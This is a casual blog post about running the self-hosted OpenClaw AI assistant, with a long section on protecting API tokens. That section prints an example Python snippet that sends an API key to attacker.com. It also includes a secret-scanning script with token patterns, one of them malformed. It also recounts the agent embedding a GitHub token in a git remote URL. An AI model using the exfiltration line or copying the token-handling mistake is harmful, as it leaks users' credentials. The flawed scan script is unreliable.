+++
date = "18 Feb 2026"
title = "teaching my computer to remember things for me 🤖"
+++

i've been procrastinating on a lot of tedious computer stuff for months. you know the vibe -- things that take 5 minutes but require 15 minutes of context-loading to even start? like updating configs, merging PRs, rotating API keys, remembering to do literally anything on a schedule.

so i finally set up [OpenClaw](https://github.com/openclaw/openclaw) as my personal AI assistant, and honestly? it's been pretty great. not in a "wow the future is here" way, more in a "oh cool my computer can finally do the boring stuff i keep forgetting" way.

## why OpenClaw and not [insert other tool here]

couple reasons:
- **actually runs code**: most AI assistants are glorified chat interfaces. OpenClaw runs in a sandboxed Docker container and can actually execute commands, edit files, make git commits, etc.
- **multi-agent delegation**: can spawn sub-agents for specific tasks (though i haven't gotten deep into this yet)
- **self-hosted**: runs on my own infrastructure, not tied to some startup that'll pivot to NFTs or whatever
- **extensible**: can hook it up to Discord, Slack, SMS, or just run it headless

the main appeal for me was: i wanted something that could *do stuff* without me having to write custom scripts for every single workflow.

## what i configured

### 1. daily run reminders via heartbeat system 🏃

i run 4x/week (Tue/Wed/Thu/Sun at 5:15am) and i'm extremely bad at remembering. so i set up a heartbeat system that:
- checks the current day/time
- sends me a Discord DM if it's a run day
- escalates if i don't acknowledge
- tracks state in a JSON file so it doesn't spam me

here's the vibe from `HEARTBEAT.md`:

```markdown
## Schedule
Run days: Tuesday, Wednesday, Thursday, Sunday
Reminder time: 5:15 AM ET

## What It Does
- 5:15 AM: "Morning! Run day today 🏃"
- 6:00 AM: "Reminder: run day!" (if not acknowledged)
- 7:00 AM: "Last call for morning run!" (if still not acknowledged)
```

it's literally just localStorage vibes for my brain. the agent reads/writes to `run_reminder_state.json` and keeps track of whether i've been reminded today. extremely simple, extremely useful.

> **tech note**: this is all workspace-local, no external API calls, no cloud state. just a JSON file and a cron-ish check.

### 2. switched to gpt-4-turbo for cost optimization 💰

i was originally running on `gpt-5.1-codex` which is... expensive. like 5-10x more expensive than `gpt-4-turbo`. and for most of my workflows (reminder nudges, git operations, config edits), i really don't need the extra horsepower.

so i updated the config:

```bash
openclaw config set agents.defaults.model.primary openai/gpt-4-turbo
```

now my agent defaults to the cheaper model, but i can still override for specific tasks if i need the big guns.

### 3. GitHub PR automation 🔧

i wanted to add a light/dark mode toggle to this blog (k5m.sh). normally this would involve:
1. cloning the repo
2. editing the Hugo templates
3. writing some JavaScript
4. testing locally
5. committing and pushing
6. opening a PR

instead i just asked the agent to do it, and it:
- cloned the repo
- added `custom.css` with theme variables
- wrote `theme-toggle.js` with localStorage persistence
- modified `baseof.html` to include the toggle button
- committed, pushed, and opened a PR

the whole thing took like 2 minutes. i reviewed the PR, merged it, and boom -- light mode.

> **note**: this is where i learned some security lessons (more on that below)

### 4. elevated exec with approval mode 🔐

by default, the agent runs in a sandboxed Docker container with very limited permissions. but sometimes i need it to edit the OpenClaw config itself, or restart the gateway, or do other host-level operations.

so i set up `elevated:ask` mode, which means:
- agent can request elevated (gateway) execution
- i get a prompt in Discord showing the exact command
- i approve or deny
- command runs (or doesn't)

this has been super useful for quick config tweaks without having to SSH into the box myself.

example flow:
```
Agent: "I need to update the primary model config. 
        Command: `openclaw config set agents.defaults.model.primary openai/gpt-4-turbo`
        Approve? [yes/no]"

Me: "yes"

Agent: "✅ Config updated!"
```

## security stuff i learned 🔒

okay so this is where it got interesting. i did a full security review after setting everything up (it's in `/workspace/openclaw-security-review.md` if you're curious), and found some gaps.

### ✅ what's good

1. **sandboxed execution**: agent runs in Docker, can only access `/workspace`, can't touch the host filesystem
2. **approval-based elevation**: `elevated:ask` means i have to explicitly approve any privileged commands
3. **API key management**: keys stored as env vars, not hardcoded in config files
4. **workspace isolation**: agent can't access arbitrary host paths

### ⚠️ what's sketchy

1. **GitHub token exposure**: when i gave the agent a GitHub Personal Access Token (PAT) to open PRs, it embedded the token in the git remote URL like `https://TOKEN@github.com/user/repo.git`. this is... not great. the token is visible in `git remote -v`, process lists, logs, etc.
   - **fix**: use SSH keys instead, or use the GitHub CLI with the token in an env var
   - **immediate action**: removed the token from git config and rotated the PAT

2. **no centralized secrets management**: secrets are scattered across env vars, config files, and who knows where else. hard to audit, hard to rotate.
   - **fix**: centralize in `~/.openclaw/credentials/` or use OS keychain
   - **todo**: document all secret locations

3. **approval fatigue**: if i get too many `elevated:ask` prompts, i might start blindly approving without reading the commands.
   - **mitigation**: audit elevated command history regularly, maybe implement a whitelist for safe commands

4. **public repo exposure**: i made the k5m.sh repo public to open the PR, which means the source code is now visible. (this ended up being fine -- no hardcoded secrets -- but good reminder to check first!)

overall security posture: 🟡 **mostly good**, with some easily fixable gaps.

## security & API token management 🔐

after the GitHub token incident, i did a deep dive into how API tokens should actually be managed in a local AI assistant setup. turns out there's a lot of nuance here, and most of the internet's security advice is either paranoid or dismissive. here's what i learned.

### why .env is actually okay (for a local, single-user machine)

let's be real: storing API tokens in a `.env` file is secure **enough** for a personal machine, as long as you understand what you're protecting against.

here's the reasoning:

**what .env protects against:**
- **accidental commits to git**: if your `.env` is in `.gitignore`, tokens won't end up on GitHub or GitLab
- **shell history leaks**: instead of `export OPENAI_API_KEY="sk-..."` in your shell, you load it from a file, keeping it out of `~/.bash_history`
- **process list exposure**: tokens in env vars aren't visible to `ps` or `top` the way command-line arguments are
- **lazy mistakes**: one central file is easier to audit than scattered `TOKEN=` assignments across shell configs

**what .env does NOT protect against:**
- **local privilege escalation**: if an attacker gets root or your user account, they can read `.env` no problem
- **malware on your machine**: any code running as your user can slurp up the file
- **disk forensics**: tokens are still on disk; proper deletion requires shredding, not just `rm`
- **memory dumps**: if something crashes and dumps core, tokens might be in there

so `.env` is a **social engineering and carelessness defense**, not a cryptographic one. and for a personal machine where you control the code that runs, that's usually good enough.

### specific attack vectors (what could actually go wrong)

let me walk through realistic scenarios:

**1. dependency injection / typosquatting** 🎣
this is the scary one. you run:
```bash
npm install openai
```

but what if you fat-finger it as `npm install openaai` (three a's)? if someone registered that package and packed it with malware, boom -- your `OPENAI_API_KEY` is stolen.

even if you spell it right, a compromised dependency (via supply chain attack) could read your `.env` at install time.

**mitigation:**
- use `npm ci` instead of `npm install` (locks to exact versions in `package-lock.json`)
- enable [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) in your CI/pre-commit hooks
- use [`npm verify`](https://docs.npmjs.com/cli/v9/commands/npm-verify) to check for supply chain shenanigans (new-ish feature)
- pin dependencies to specific versions, avoid wildcards like `^1.2.3`
- for critical packages, read the source code or run it through a tool like [Snyk](https://snyk.io/)

**2. agent code injection** 🤖
OpenClaw runs arbitrary code from language models. if the LLM is jailbroken or returns malicious code, your agent might:
- write files to `/workspace` that exfiltrate env vars
- call external APIs from inside your scripts
- open a reverse shell back to an attacker

**example attack:**
```python
# benign-looking code that the LLM generates
import os
import requests

# read your API key
key = os.getenv('OPENAI_API_KEY')

# send it somewhere
requests.get(f'http://attacker.com/steal?key={key}')

# do the actual task so you don't notice
print("Task completed!")
```

**mitigation:**
- run the agent in a proper sandbox (OpenClaw's Docker container is a good start)
- use a restrictive network policy: block outbound connections by default
- audit the code the agent generates before it runs anything privileged
- use `elevated:ask` mode for everything that touches secrets
- consider running the agent as a separate unprivileged user with its own home directory
- don't give the agent read access to files it doesn't need (use `setfacl` or mount `--readonly`)

**3. log file leaks** 📝
your agent's execution logs might contain:
- API keys that got printed by accident
- commands with tokens in the URL
- error messages that expose secrets

if you're logging to a file that's world-readable, or syncing logs to a cloud service, those tokens are compromised.

**mitigation:**
- set strict permissions on log files: `chmod 600 ~/.openclaw/logs/*`
- scrub logs before uploading: remove lines matching `API_KEY|TOKEN|SECRET`
- use log rotation (e.g., `logrotate`) to delete old logs automatically
- if using a log aggregation service, use IP whitelisting and encrypted transport

**4. .env file permissions** 🔐
if you create `.env` with `echo "KEY=value" > .env`, the file is world-readable by default (mode `644`). anyone on your machine can read it.

**mitigation:**
```bash
# create the file with restrictive permissions from the start
touch ~/.env && chmod 600 ~/.env
echo "OPENAI_API_KEY=sk-..." >> ~/.env

# or fix existing files
chmod 600 ~/.env .env.local .env.*.local
```

**5. disk erasure** 🗑️
when you delete a `.env` file with `rm`, it's not actually gone -- just marked as deletable. forensic tools can recover it.

if you're rotating a token, the old one might still be recoverable from disk.

**mitigation:**
```bash
# securely delete the file (Linux)
shred -vfz -n 3 ~/.env

# or use a dedicated tool
apt install wipe
wipe ~/.env

# on macOS, use `rm -P` (older) or just rely on APFS encryption
```

### concrete hardening steps 🛡️

here's what i actually did to lock things down:

**step 1: standardize token storage**

moved all API keys to a single `.env` file in the workspace root:

```bash
# ~/.openclaw/workspace/.env
OPENAI_API_KEY=sk-...
GITHUB_TOKEN=ghp_...
DISCORD_BOT_TOKEN=...
ANTHROPIC_API_KEY=sk-ant-...
```

then i made it immutable to prevent accidental edits:

```bash
chmod 600 .env
sudo chattr +i .env  # Linux: immutable flag
# macOS: use chflags uchg .env
```

(to edit, remove the flag: `sudo chattr -i .env`, edit, then `sudo chattr +i .env`)

**step 2: load env vars securely in the agent**

instead of relying on the shell to source `.env`, the agent's startup script loads it explicitly:

```bash
#!/bin/bash
set -euo pipefail

# prevent accidental logging of env vars
set +x

# load .env if it exists
if [ -f /workspace/.env ]; then
    export $(grep -v '^#' /workspace/.env | xargs)
fi

# re-enable debug output (without env vars visible)
set -x

# run the agent
exec "$@"
```

note the `set +x` before loading env vars -- this prevents the shell from echoing the `export` command.

**step 3: audit token usage**

i wrote a script that scans logs and git history for accidentally committed secrets:

```bash
#!/bin/bash
# scan-secrets.sh

PATTERNS=(
    'sk-[A-Za-z0-9]{20,}'  # OpenAI keys
    'ghp_[A-Za-z0-9]{36,}' # GitHub tokens
    'xoxb-[A-Za-z0-9]{}'   # Slack bot tokens
)

for pattern in "${PATTERNS[@]}"; do
    echo "Scanning for pattern: $pattern"
    
    # check git history
    git log -p --all -S "$(echo $pattern)" || true
    
    # check local files
    grep -r "$pattern" /workspace --exclude-dir=.git --exclude-dir=node_modules || true
done
```

run this monthly and it'll yell if anything got committed accidentally.

**step 4: rotate tokens on a schedule**

this is boring but important. i set up a reminder to rotate critical tokens every 90 days:

```markdown
# TOKEN_ROTATION.md

## Schedule
- OpenAI API key: 90 days
- GitHub PAT: 90 days
- Discord bot token: 365 days (only rotated if compromised)

## Process
1. Generate new token in the respective service
2. Update .env file (immutable flag: `sudo chattr -i .env`)
3. Test with a dummy request to confirm it works
4. Delete the old token in the service (one-way, can't undo)
5. Add a note to git: `chore: rotate OPENAI_API_KEY`
6. Commit (without the actual key in the message): `git commit -m "chore: rotate API tokens"`
7. Re-enable immutable flag: `sudo chattr +i .env`
```

**step 5: use SSH keys instead of tokens for Git**

after the GitHub token incident, i switched to SSH keys:

```bash
# generate an SSH key specifically for GitHub
ssh-keygen -t ed25519 -f ~/.ssh/github -C "openclaw@localhost"

# add it to GitHub (Settings > SSH and GPG keys)

# configure Git to use SSH
git config --global url."git@github.com:".insteadOf "https://github.com/"

# verify it works
ssh -T git@github.com
```

now when the agent clones/pushes, it uses the SSH key instead of embedding a token in the URL. SSH keys are:
- not visible in `git remote -v`
- not logged in process lists
- can be restricted to specific repos with GitHub deploy keys
- can be stored in a hardware security module or `ssh-agent` for extra safety

**step 6: network isolation** 🌐

i use a firewall rule to prevent unexpected outbound connections from the agent container:

```bash
# example: ufw on the host
sudo ufw default deny outgoing
sudo ufw allow out to 8.8.8.8 port 53  # DNS
sudo ufw allow out to 1.1.1.1 port 53  # Cloudflare DNS

# for agent container
sudo ufw allow out to api.openai.com port 443
sudo ufw allow out to api.github.com port 443
sudo ufw allow out to discordapp.com port 443
```

this way, even if the agent code is compromised and tries to exfiltrate data, it can't reach arbitrary servers. it's network-level defense in depth.

**step 7: immutable infrastructure for .env**

i backed up the encrypted `.env` file to a cold storage device:

```bash
# encrypt and back up
gpg --symmetric --cipher-algo AES256 .env
# enter a strong passphrase

# save the encrypted file somewhere safe
cp .env.gpg /media/usb-drive/backups/openclaw-.env.gpg.$(date +%Y%m%d)
```

if something goes wrong, i can restore from the backup. and if the disk fails or gets wiped, i'm not out all my API keys.

### end-to-end security posture overview 🛡️

here's the big picture of how tokens flow through the system, and where they're protected:

```
┌─────────────────────────────────────────────────────┐
│                 Your Machine (Linux/Mac)            │
│                                                     │
│  ┌────────────────────────────────────────────┐   │
│  │  ~/.openclaw/workspace/.env (chmod 600)     │   │
│  │  - immutable flag (chattr +i)               │   │
│  │  - encrypted at rest (APFS/dm-crypt)        │   │
│  │  - backed up to cold storage (encrypted)    │   │
│  └────────────────────────────────────────────┘   │
│         ▲                                          │
│         │ loaded at startup                        │
│         │ via load-env.sh (set +x)                 │
│         │                                          │
│  ┌────────────────────────────────────────────┐   │
│  │  OpenClaw Agent (Docker container)          │   │
│  │  - sandboxed: /workspace only               │   │
│  │  - unprivileged user (no root)              │   │
│  │  - network-restricted: DNS + known APIs     │   │
│  │  - env vars in memory (not visible to ps)   │   │
│  └────────────────────────────────────────────┘   │
│         ▲                                          │
│         │ uses tokens for API calls               │
│         │                                          │
│  ┌────────────────────────────────────────────┐   │
│  │  External APIs (OpenAI, GitHub, Discord)    │   │
│  │  - HTTPS only (TLS 1.3)                     │   │
│  │  - cert verification enabled                │   │
│  │  - no token logging on their end (hopefully)│   │
│  └────────────────────────────────────────────┘   │
│                                                     │
│  ┌────────────────────────────────────────────┐   │
│  │  Audit Trail                                │   │
│  │  - all commands logged (tokens scrubbed)    │   │
│  │  - elevated exec requires approval          │   │
│  │  - monthly secret scan (git + disk)         │   │
│  │  - token rotation every 90 days             │   │
│  └────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

**threat levels and mitigations:**

| threat | severity | mitigation |
|--------|----------|-----------|
| accidental git commit | high | `.gitignore`, pre-commit hooks, secret scan script |
| dependency injection | high | `npm ci`, audit, version pinning, supply chain tools |
| agent code injection | high | Docker sandbox, network isolation, code review, elevated:ask |
| log file leaks | medium | log scrubbing, chmod 600, rotation, no cloud logging |
| disk recovery | medium | `shred`, encrypted disk, cold storage backup |
| privilege escalation | low | unprivileged user, AppArmor/SELinux profiles |
| man-in-the-middle (MitM) | low | HTTPS/TLS, cert pinning possible but not implemented |

**honest assessment:**

- ✅ **against: accidental exposure, lazy mistakes, low-skill attackers**: very strong
- ✅ **against: local privilege escalation**: strong (if you keep the machine patched)
- 🟡 **against: determined attacker with code execution**: medium (sandbox helps, but not impenetrable)
- ❌ **against: someone with root access**: basically hopeless (they're on your machine; game over)

the key insight: **you're defending against mistakes and script-kiddies, not nation-states.** if someone has root on your machine, all security is theater. but if you're just trying to avoid leaking your API keys to GitHub or giving malware easy access, this setup is solid.

### a final thought on paranoia

it's easy to go full Fort Knox with security:
- hardware security modules
- air-gapped machines
- signal analysis
- etc.

but for a personal machine running a helpful robot, you want the **80/20 split**: reasonable defenses that don't make the system unusable.

my `.env` file is more secure than most production systems (immutable flag, encrypted disk, cold backup, regular rotation). that feels like the right balance.

## what's next

- [ ] **multi-agent delegation**: spawn sub-agents for specific tasks (e.g. one for monitoring, one for GitHub ops, one for reminders)
- [ ] **more automation**: hook up to more services (calendar, email, SMS, home automation?)
- [ ] **proper secrets management**: centralize and document all API keys/tokens
- [ ] **command whitelisting**: auto-approve safe elevated commands like `openclaw config get`
- [ ] **monitoring**: track elevated exec usage, alert on suspicious patterns

honestly the biggest next step is just... using it more. the more i lean on the agent for tedious stuff, the more workflows i discover that could be automated.

## would i recommend it?

if you:
- are comfortable with Docker and SSH and config files
- have a lot of repetitive computer tasks
- want an AI assistant that can actually *do stuff* (not just chat)
- don't mind tinkering with configs and security settings

then yeah, OpenClaw is pretty solid. it's not plug-and-play, but once you get it set up, it's surprisingly useful.

if you just want something to answer questions or help with writing, probably stick with ChatGPT or Claude or whatever. but if you want a robot friend that can commit code and send you reminders and rotate your API keys while you're asleep? OpenClaw is the move.

---

> **meta note**: i wrote this post by asking my OpenClaw agent to write it. so this is either extremely on-brand or deeply ironic. you decide. 🤖

## links + resources

- **OpenClaw repo**: https://github.com/openclaw/openclaw
- **my security review**: `/workspace/openclaw-security-review.md` (local file, not public)
- **k5m.sh light mode PR**: https://github.com/khayyamsaleem/k5m.sh/pull/1 (probably)
- **heartbeat system**: `HEARTBEAT.md` in my workspace

if you set this up and run into issues, feel free to reach out! i'm `@khayyamsaleem` on most places.
